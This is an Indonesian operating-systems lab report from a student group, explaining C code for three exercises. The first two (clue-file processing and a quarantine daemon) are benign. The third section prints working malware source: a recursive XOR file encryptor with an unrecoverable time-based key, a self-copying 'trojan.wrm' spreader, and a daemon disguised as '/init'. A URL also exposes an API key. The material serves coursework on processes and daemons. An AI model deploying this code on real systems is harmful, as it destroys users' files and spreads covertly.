# Sisop-2-2025-IT31

- Erlangga Valdhio Putra Sulistio_5027241030
- Rayhan Agnan Kusuma_5027241102
- S. Farhan Baig_5027241097


## Soal_1 – The Stellar Showdown: Directory Lister vs Naga Cyrus
### Deskripsi Singkat
Kamu terbangun di tempat misterius yang dijaga naga bernama Cyrus. Untuk melewati pintu yang ia jaga, kamu diberi file bernama Clues.zip. 
Tugasmu adalah mengekstrak file tersebut dan mengolah isi di dalamnya untuk mendapatkan password yang dapat kamu cek di website berikut:

🌐 https://dragon-pw-checker.vercel.app/

### Alur Pengerjaan
1. Download Clues
    - ./action
    - Unduh Clues.zip dan extract isinya ke folder Clues/

2. Filter Files
    - ./action -m Filter
    - File valid (nama 1 karakter huruf/angka + .txt) → Filtered/
    - File lainnya dihapus

3. Combine File Content
    - ./action -m Combine
    - Gabung isi file valid ke Combined.txt (urutan: angka-huruf-angka-huruf)
    - Hapus file setelah digabung

4. Decode File
    - ./action -m Decode
    - Lakukan ROT13 ke isi Combined.txt, hasil ke Decoded.txt

5. Password Check
    - Buka Decoded.txt
    - Cek hasilnya ke situs checker

### Penjelasan Code ```action.c``` berdasarkan kategori soal
#### a. Downloading the Clues
#### Soal : jika ```./action``` dijalankan tanpa argumen, maka program akan mengunduh dan mengekstrak Clues.zip. Jika folder ```Clues/``` sudah ada, maka skip download.
#### Implementasi code :
```bash
void downloadClues() {
    struct stat st = {0};

    // Mengecek apakah folder Clues sudah ada
    if (stat("Clues", &st) == -1) {
        // Download Clues.zip menggunakan wget
        pid_t pid = fork();
        if (pid == 0) {
            execl("/bin/sh", "sh", "-c",
                "wget --no-check-certificate --content-disposition \"https://drive.usercontent.google.com/u/0/uc?id=...\" -O Clues.zip",
                NULL);
            perror("wget failed");
            exit(EXIT_FAILURE);
        } else {
            wait(NULL);
        }

        // Buat folder Clues dan unzip isi Clues.zip ke dalamnya
        mkdir("Clues", 0777);
        pid = fork();
        if (pid == 0) {
            char *argv[] = {"unzip", "Clues.zip", "-d", "Clues", NULL};
            execvp("unzip", argv);
            exit(EXIT_FAILURE);
        } else {
            wait(NULL);
        }

        // Jika ada nested folder (Clues/Clues), pindahkan isinya
        if (stat("Clues/Clues", &nested) == 0) {
            pid = fork();
            if (pid == 0) {
                execl("/bin/sh", "sh", "-c", "mv Clues/Clues/* Clues/", NULL);
                exit(EXIT_FAILURE);
            } else {
                wait(NULL);
                rmdir("Clues/Clues");
            }
        }

        // Hapus Clues.zip
        unlink("Clues.zip");
        printf("Berhasil download dan extract Clues.zip\n");
    } else {
        printf("Folder Clues sudah ada, skip download.\n");
    }
}

```

#### b. Filtering the Files
#### Soal : Menyaring file yang hanya memiliki 1 huruf atau angka (tanpa karakter spesial) dan menyimpannya ke folder ```Filtered/```. File lain dihapus.
#### Implementasi code :
```bash
void filterFiles() {
    DIR *dir = opendir("./Clues");
    if (!dir) {
        printf("Folder Clues tidak ditemukan!\n");
        return;
    }

    // Hapus folder Filtered jika sudah ada
    pid_t pid = fork();
    if (pid == 0) {
        execl("/bin/sh", "sh", "-c", "rm -rf Filtered", NULL);
        exit(0);
    } else {
        wait(NULL);
    }

    mkdir("Filtered", 0777);
    ...

    // Iterasi folder ClueA-D
    while ((de = readdir(dir)) != NULL) {
        if (de->d_type == DT_DIR && ... ) {
            ...
            // Iterasi file dalam setiap ClueX/
            while ((sub = readdir(subdir)) != NULL) {
                if (sub->d_type == DT_REG) {
                    // Validasi nama file: hanya 1 karakter + ".txt"
                    if (len == 5 && isalnum(sub->d_name[0]) &&
                        strcmp(&sub->d_name[1], ".txt") == 0) {
                        rename(src, dest); // Pindahkan ke Filtered
                    } else {
                        remove(to_delete); // Hapus file lain
                    }
                }
            }
        }
    }

    printf("Filtering selesai!\n");
}

```

####  c. Combine the File Content
#### Soal : Gabungkan isi dari file .txt di  ```Filtered/ ``` ke dalam Combined.txt dengan urutan angka → huruf → angka → huruf dan seterusnya. File aslinya dihapus setelah digabung.
#### Implementasi code :
```bash
void combineFiles() {
    ...

    // Pisahkan nama file berdasarkan huruf atau angka
    while ((de = readdir(dir)) != NULL) {
        if (de->d_type == DT_REG) {
            if (isdigit(de->d_name[0]))
                strcpy(angka[idxA++], de->d_name);
            else if (isalpha(de->d_name[0]))
                strcpy(huruf[idxH++], de->d_name);
        }
    }

    // Urutkan angka secara numerik dan huruf secara alphabet
    sort(angka);
    sort(huruf);

    // Gabungkan isinya secara berselang-seling: angka-huruf
    int i = 0, j = 0;
    while (i < idxA || j < idxH) {
        if (i < idxA) baca_dan_tulis(angka[i++]);
        if (j < idxH) baca_dan_tulis(huruf[j++]);
    }

    printf("Combine selesai!\n");
}

```


####  d. Decode the File
#### Soal : Decode isi Combined.txt menggunakan ROT13, lalu simpan ke Decoded.txt.
#### Implementasi code :
```bash
char rot13(char c) {
    if ('a' <= c && c <= 'z') return 'a' + (c - 'a' + 13) % 26;
    if ('A' <= c && c <= 'Z') return 'A' + (c - 'A' + 13) % 26;
    return c;
}

void decodeFile() {
    FILE *in = fopen("Combined.txt", "r");
    FILE *out = fopen("Decoded.txt", "w");

    char c;
    while ((c = fgetc(in)) != EOF) {
        fputc(rot13(c), out);
    }

    fclose(in);
    fclose(out);
    printf("Decode selesai!\n");
}


```
####  e. Password Check
#### Soal : Masukkan hasil dari Decoded.txt ke website checker:
 ```https://dragon-pw-checker.vercel.app ```
#### Implementasi :
        - Tidak ada kode spesifik karena dicek manual via browser
        - Cukup buka Decoded.txt, copy, lalu paste ke website checker

#### Tambahan Error Handling / Help Message
#### Implementasi :
```bash
int main(int argc, char *argv[]) {
    if (argc == 1) {
        downloadClues();
    } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filter") == 0) filterFiles();
        else if (strcmp(argv[2], "Combine") == 0) combineFiles();
        else if (strcmp(argv[2], "Decode") == 0) decodeFile();
        else print_usage();
    } else {
        print_usage();
    }
}

```

#### Contoh penggunaan program
```bash
# Download dan extract Clues.zip
$ ./action

# Filter file valid ke folder Filtered/
$ ./action -m Filter

# Gabungkan isi file menjadi Combined.txt
$ ./action -m Combine

# Decode hasil gabungan ke Decoded.txt
$ ./action -m Decode

# Cek hasil di website checker
$ cat Decoded.txt

```

### Struktur Direktori Akhir
```bash
soal_1/
├── action.c
├── Clues/
│   ├── ClueA/
│   ├── ClueB/
│   ├── ClueC/
│   └── ClueD/
├── Filtered/
│   ├── a.txt
│   ├── 1.txt
│   └── ...
├── Combined.txt
├── Decoded.txt
└── action (binary hasil compile)

```


## Soal_2 – The Starter Kit: Kanade & Mafuyu's Decryption Daemon
### Deskripsi Singkat
Kanade dan Mafuyu menemukan starter kit misterius yang menyimpan file mencurigakan. Mereka memintamu membuat sistem dekripsi yang berjalan secara daemon dan mampu menangani proses karantina, pengembalian, serta penghapusan file secara otomatis, lengkap dengan pencatatan ke dalam log.

Starter kit harus bisa dijalankan dan dimatikan, serta mendukung mode khusus:
- `--start` untuk menjalankan sebagai daemon
- `--shutdown` untuk menghentikan daemon
- `--quarantine` untuk memindahkan file mencurigakan ke folder `Quarantine/`
- `--return` untuk mengembalikan file dari `Quarantine/` ke `Starter_Kit/`
- `--eradicate` untuk menghapus file secara permanen

---

### Alur Pengerjaan
1. Jalankan starter kit
    - `./starter_kit --start`
    - Daemon aktif, menyiapkan semua folder yang dibutuhkan

2. Karantina File
    - `./starter_kit --quarantine`
    - File mencurigakan di `Starter_Kit/` dipindahkan ke `Quarantine/`

3. Pengembalian File
    - `./starter_kit --return`
    - File dikembalikan dari `Quarantine/` ke `Starter_Kit/`

4. Penghapusan File
    - `./starter_kit --eradicate`
    - File di `Quarantine/` dihapus permanen

5. Matikan daemon
    - `./starter_kit --shutdown`

6. Semua aktivitas dicatat di `activity.log`

---

### Penjelasan Code `starter_kit.c` berdasarkan kategori soal

#### a. Starting the Daemon
**Soal:** Jalankan program sebagai daemon menggunakan `--start`

**Implementasi:**
```bash
if (strcmp(argv[1], "--start") == 0) {
    pid_t pid = fork();
    if (pid == 0) {
        umask(0);
        setsid();
        chdir("/path/to/dir");
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        // simpan PID ke .starterkit.pid
        // tulis ke activity.log
    }
}
```



#### a. Starting the Daemon
**Soal:** Jalankan program sebagai daemon menggunakan `--start`

**Implementasi:**
```bash
if (strcmp(argv[1], "--start") == 0) {
    pid_t pid = fork();
    if (pid == 0) {
        umask(0);
        setsid();
        chdir("/path/to/dir");
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        // simpan PID ke .starterkit.pid
        // tulis ke activity.log
    }
}
```


    # README - StarterKit Program (Soal Nomor 2)


### b. Pembuatan Folder Otomatis
**Soal:** Pastikan folder `starter_kit`, `quarantine`, dan `decrypted` dibuat jika belum ada.

**Implementasi:**
```c
mkdir(STARTERKIT_DIR, 0777);
mkdir(QUARANTINE_DIR, 0777);
mkdir("decrypted", 0777);
```

### c. Dekripsi Nama File (Base64) dengan Daemon
**Soal:** Jalankan dekripsi nama file dari base64 ke nama asli secara berkala (setiap 5 detik).

**Implementasi:**
```c
void run_daemon_decrypt() {
    // membaca file di folder quarantine dan mendekripsi nama file base64-nya
    // menyimpan hasil dekripsi di folder decrypted (opsional)
    // loop setiap 5 detik
}
```

### d. Memindahkan File ke Folder Quarantine
**Soal:** File dari `starter_kit` dipindahkan ke `quarantine`, lalu dicatat ke dalam `activity.log`

**Implementasi:**
```c
void move_to_quarantine() {
    // Iterasi file dalam starter_kit dan pindahkan ke quarantine
    // Tulis log aktivitas
}
```

### e. Mengembalikan File dari Quarantine ke Starter Kit
**Soal:** Kembalikan file dari `quarantine` ke `starter_kit` jika diminta

**Implementasi:**
```c
void return_to_starterkit() {
    // Iterasi file dalam quarantine dan pindahkan kembali ke starter_kit
    // Tulis log aktivitas
}
```

### f. Menghapus File dalam Folder Quarantine
**Soal:** Menghapus file yang ada dalam folder `quarantine` secara permanen

**Implementasi:**
```c
void delete_quarantine_contents() {
    // Iterasi dan hapus semua file dalam folder quarantine
    // Tulis log aktivitas
}
```

### g. Mematikan Proses Daemon
**Soal:** Kirim sinyal `SIGTERM` ke proses daemon yang sedang berjalan

**Implementasi:**
```c
void shutdown_daemon() {
    // Baca PID dari decrypt.pid
    // Kirim sinyal SIGTERM ke proses
    // Hapus file decrypt.pid
}
```

### h. Logging Aktivitas
**Soal:** Setiap aktivitas penting ditulis ke dalam file `activity.log`

**Implementasi:**
```c
void write_log(const char *msg) {
    // Dapatkan waktu sekarang
    // Tulis pesan + waktu ke dalam activity.log
}
```

## Cara Menjalankan
Program ini dijalankan dengan beberapa argumen sebagai berikut:
```bash
./starterkit --start       # Menjalankan program sebagai daemon
./starterkit --decrypt     # Menjalankan proses daemon dekripsi
./starterkit --quarantine  # Memindahkan file dari starter_kit ke quarantine
./starterkit --return      # Mengembalikan file dari quarantine ke starter_kit
./starterkit --eradicate   # Menghapus semua file dalam quarantine
./starterkit --shutdown    # Mematikan proses daemon
```

## Catatan Penting
- File di `quarantine` diasumsikan memiliki nama yang terenkripsi dalam format base64.
- Direktori `decrypted` disiapkan untuk ekstensi di masa depan.
- Selalu matikan proses daemon menggunakan `--shutdown` sebelum keluar atau restart sistem.

---

## Soal_3 - Malware
### Deskripsi Singkat
"Dok dok dorokdok dok rodok" adalah malware buatan Andriana dari PT Mafia Security Cabang Ngawi, yang dirancang untuk menyusup dan menginfeksi sistem Linux secara stealth melalui daemon berproses /init. Malware ini memiliki 4 fitur utama:

1. wannacryptor
Encryptor yang bekerja setiap 30 detik.
Kelompok ganjil: enkripsi file dan folder secara rekursif menggunakan XOR dengan timestamp.
Kelompok genap: folder dikompresi menjadi .zip, lalu dienkripsi dan folder asli dihapus.

2. trojan.wrm
Spreader yang menyebarkan malware ke seluruh direktori di dalam ~/ dengan menyalin binary malware ke setiap folder.

3. rodok.exe
Fork bomb terkontrol yang menjalankan minimal 3 proses anak bernama mine-crafter-XX.

4. /init
Proses utama yang berubah nama menjadi /init untuk menyembunyikan diri di daftar proses, bekerja sebagai daemon.

### Alur Pengerjaan


### Penjelasan kode

1. Buatlah sebuah folder kosong baru di directory home dan gunakan folder di dalam zip https://drive.google.com/file/d/12COBJZHO3orgy8LYCVOIVr0DPvI0Twzy/view?usp=sharing untuk memperagakan sub soal
```bash
int download_data() {
    CURL *curl;
    FILE *fp;
    CURLcode res;

    const char *url = "https://www.googleapis.com/drive/v3/files/12COBJZHO3orgy8LYCVOIVr0DPvI0Twzy?alt=media&key=AIzaSyB6kgi_bSqmnbnMxydPwnC2UFsBj4VPId8"; # Link file gdrive yang akan didownload
    const char *namaFile = "test.zip"; # Nama file setelah didownload

    curl = curl_easy_init();
    if (curl) {
        fp = fopen(namaFile, "wb");   # Membuka file untuk ditulis dalam mode binary
        if (!fp) return 1;

        curl_easy_setopt(curl, CURLOPT_URL, url);  
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);  
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); 

        res = curl_easy_perform(curl);  
        curl_easy_cleanup(curl);
        fclose(fp);

        if (res != CURLE_OK) return 1;
    } else {
        return 1;
    }

    # Ekstrak file zip setelah berhasil didownload
    char perintahUnzip[256];
    snprintf(perintahUnzip, sizeof(perintahUnzip), "unzip -o %s", namaFile); 
    int hasilUnzip = system(perintahUnzip);
    if (hasilUnzip != 0) return 1;

    return 0;
}
```
- `curl_easy_setopt(curl, CURLOPT_URL, url);` Digunakan untuk mengatur link sumber file yang akan didownload.
- `fp = fopen(namaFile, "wb");` Membuka file test.zip untuk ditulis dalam bentuk binary (wb = write binary), sebagai tujuan hasil download.
- `curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);` Memberitahu CURL untuk menyimpan data yang didownload langsung ke file fp.
- `snprintf(perintahUnzip, sizeof(perintahUnzip), "unzip -o %s", namaFile); system(perintahUnzip);` Membuat dan menjalankan perintah unzip untuk mengekstrak isi dari file test.zip.



2. Enkripsi Rekursif File dengan XOR
```bash
void encryptfile(const char *lokasiFile, unsigned char kunci) {
    FILE *fp = fopen(lokasiFile, "rb+");
    if (!fp) return;

    fseek(fp, 0, SEEK_END);
    long ukuranFile = ftell(fp);
    rewind(fp);

    unsigned char *buffer = malloc(ukuranFile);
    if (!buffer) {
        fclose(fp);
        return;
    }

    fread(buffer, 1, ukuranFile, fp);
    rewind(fp);

    for (long i = 0; i < ukuranFile; i++) {
        buffer[i] ^= kunci;
    }

    fwrite(buffer, 1, ukuranFile, fp);
    fclose(fp);
    free(buffer);
}

void encrypt(const char *pathDasar, unsigned char kunci) {
    struct dirent *entri;
    DIR *direktori = opendir(pathDasar);
    if (!direktori) return;

    char pathLengkap[1024];

    while ((entri = readdir(direktori)) != NULL) {
        if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0)
            continue;

        snprintf(pathLengkap, sizeof(pathLengkap), "%s/%s", pathDasar, entri->d_name);

        struct stat infoPath;
        if (stat(pathLengkap, &infoPath) == -1) continue;

        if (S_ISDIR(infoPath.st_mode)) {
            encrypt(pathLengkap, kunci);
        } else if (S_ISREG(infoPath.st_mode)) {
            encryptfile(pathLengkap, kunci);
        }
    }

    closedir(direktori);
}
```
- `FILE *fp = fopen(lokasiFile, "rb+"); if (!fp) return;`  Membuka file dalam mode baca dan tulis biner.
- `fseek(fp, 0, SEEK_END); long ukuranFile = ftell(fp); rewind(fp);` Digunakan untuk menentukan ukuran file. fseek memindahkan kursor ke akhir file, lalu ftell mengambil posisi kursor (yang berarti ukuran file). rewind mengembalikan posisi baca ke awal file.
- `unsigned char *buffer = malloc(ukuranFile); if (!buffer) { fclose(fp); return; }` Mengalokasikan memori sebanyak ukuran file untuk menampung isi file.
- `fread(buffer, 1, ukuranFile, fp); rewind(fp);` Membaca seluruh isi file ke dalam buffer, lalu kembali ke awal file.
- `for (long i = 0; i < ukuranFile; i++) { buffer[i] ^= kunci; }` Melakukan operasi XOR terhadap setiap byte data dengan kunci untuk mengenkripsi
- `fwrite(buffer, 1, ukuranFile, fp); fclose(fp); free(buffer);` Menulis ulang isi buffer yang sudah dienkripsi ke file, lalu menutup file dan membebaskan alokasi memori.

- `struct dirent *entri; DIR *direktori = opendir(pathDasar); if (!direktori) return;` Membuka direktori berdasarkan path yang diberikan.
- `while ((entri = readdir(direktori)) != NULL) { if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0) continue;` Membaca isi direktori satu per satu.
- `snprintf(pathLengkap, sizeof(pathLengkap), "%s/%s", pathDasar, entri->d_name);` Membentuk path lengkap dari file atau folder yang sedang diproses.
- `struct stat infoPath; if (stat(pathLengkap, &infoPath) == -1) continue;` Mengambil informasi tentang path tersebut.
- `if (S_ISDIR(infoPath.st_mode)) { encrypt(pathLengkap, kunci); } else if (S_ISREG(infoPath.st_mode)) { encryptfile(pathLengkap, kunci);}` Jika entri adalah direktori, panggil encrypt lagi secara rekursif.

3. Penyebaran Trojan ke Direktori dan Subdirektori
```bash
void trojan(const char *direktoriTarget, const char *lokasiMalware) {
    DIR *dir = opendir(direktoriTarget);
    if (!dir) return;

    struct dirent *entri;
    char path[1024];

    while ((entri = readdir(dir)) != NULL) {
        if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", direktoriTarget, entri->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            trojan(path, lokasiMalware);
        }
    }

    char pathTujuan[1024];
    snprintf(pathTujuan, sizeof(pathTujuan), "%s/trojan.wrm", direktoriTarget);

    FILE *src = fopen(lokasiMalware, "rb");
    FILE *dst = fopen(pathTujuan, "wb");
    if (src && dst) {
        char buf[4096];
        size_t jumlah;
        while ((jumlah = fread(buf, 1, sizeof(buf), src)) > 0) {
            fwrite(buf, 1, jumlah, dst);
        }
    }
    if (src) fclose(src);
    if (dst) fclose(dst);

    closedir(dir);
}
```
- `DIR *dir = opendir(direktoriTarget); if (!dir) return;` Membuka direktori target untuk dibaca.
- `while ((entri = readdir(dir)) != NULL) { if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0) continue;` Membaca setiap entri di dalam direktori.
- `snprintf(path, sizeof(path), "%s/%s", direktoriTarget, entri->d_name);` Membentuk path lengkap dari entri direktori yang sedang diproses.
- `struct stat st; if (stat(path, &st) == -1) continue;` Mendapatkan informasi tentang entri tersebut.
- `if (S_ISDIR(st.st_mode)) { trojan(path, lokasiMalware); }` Memanggil fungsi trojan secara rekursif untuk menyebarkan malware ke subdirektori.
- `char pathTujuan[1024]; snprintf(pathTujuan, sizeof(pathTujuan), "%s/trojan.wrm", direktoriTarget);` Menentukan path tujuan untuk malware.
- `FILE *src = fopen(lokasiMalware, "rb");
FILE *dst = fopen(pathTujuan, "wb");
if (src && dst) {
    char buf[4096];
    size_t jumlah;
    while ((jumlah = fread(buf, 1, sizeof(buf), src)) > 0) {
        fwrite(buf, 1, jumlah, dst);
    }
}` Membuka file malware dari lokasiMalware dan membuka file tujuan trojan.wrm di direktori target. Kemudian, menyalin isi file malware ke dalam file tujuan.

4. Daemon
```bash
void inidaemon(const char *direktoriTarget, const char *lokasiSendiri) {
    pid_t pid, sid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);
    if ((chdir("/")) < 0) exit(EXIT_FAILURE);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);

    while (1) {
        time_t waktu = time(NULL);
        unsigned char kunci = (unsigned char)(waktu % 256);

        encrypt(direktoriTarget, kunci);
        trojan(direktoriTarget, lokasiSendiri);

        sleep(30);
    }
}
```
- `pid_t pid, sid;
pid = fork();
if (pid < 0) exit(EXIT_FAILURE);
if (pid > 0) exit(EXIT_SUCCESS);` Melakukan fork() untuk membuat proses anak.
- `umask(0);
sid = setsid();
if (sid < 0) exit(EXIT_FAILURE);
if ((chdir("/")) < 0) exit(EXIT_FAILURE);`
1) umask(0) mengatur permission default file agar tidak dibatasi.
2) setsid() membuat sesi baru agar proses menjadi leader tanpa terminal kontrol.
3) chdir("/") mengubah direktori kerja ke root (/) agar daemon tidak mengunci direktori.
- `prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);` Mengganti nama proses menjadi /init.
- `while (1) {
    time_t waktu = time(NULL);
    unsigned char kunci = (unsigned char)(waktu % 256);
    encrypt(direktoriTarget, kunci);
    trojan(direktoriTarget, lokasiSendiri);
    sleep(30);
}` 
1) Mengambil waktu saat ini (time(NULL)), dan mengubahnya menjadi kunci XOR.
2) Menjalankan fungsi encrypt untuk enkripsi seluruh file di direktori target dengan kunci tersebut.
3) Menjalankan fungsi trojan untuk menyebarkan file malware ke seluruh subdirektori.
4) Looping setiap 30 detik.












